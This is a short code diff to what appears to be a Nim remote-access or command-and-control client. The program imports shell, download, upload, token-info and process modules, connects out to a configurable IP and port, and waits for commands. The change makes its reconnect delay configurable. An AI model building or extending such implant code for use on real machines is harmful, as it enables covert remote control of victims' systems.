@@ -7,6 +7,7 @@ import ../clientTasks/[shell, msgbox, download, tokinfo, processes, upload]
 var client: Socket = newSocket()
 
 const port {.intdefine.}: int = 1234
+const autoConnectTime {.intdefine.}: int = 5000
 const ip {.strdefine.}: string = "127.0.0.1"
 
 when defined(linux):
@@ -66,9 +67,8 @@ while true:
   try:
     client.connect(ip, Port(port))
   except OSError:
+    sleep(autoConnectTime)
     continue
   receiveCommands(client)
   client = newSocket()
-  sleep(1000*5)
-
-# 
+  sleep(autoConnectTime)
